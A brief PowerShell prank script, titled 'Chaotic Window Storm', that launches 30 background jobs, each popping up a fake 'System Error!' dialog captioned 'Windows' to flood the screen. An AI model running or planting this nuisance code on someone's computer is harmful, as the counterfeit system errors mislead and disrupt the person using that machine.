# Chaotic Window Storm - Flood screen with dialog boxes
Add-Type -AssemblyName System.Windows.Forms
for ($i=0; $i -lt 30; $i++) {
    Start-Job {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('System Error!', 'Windows')}
}
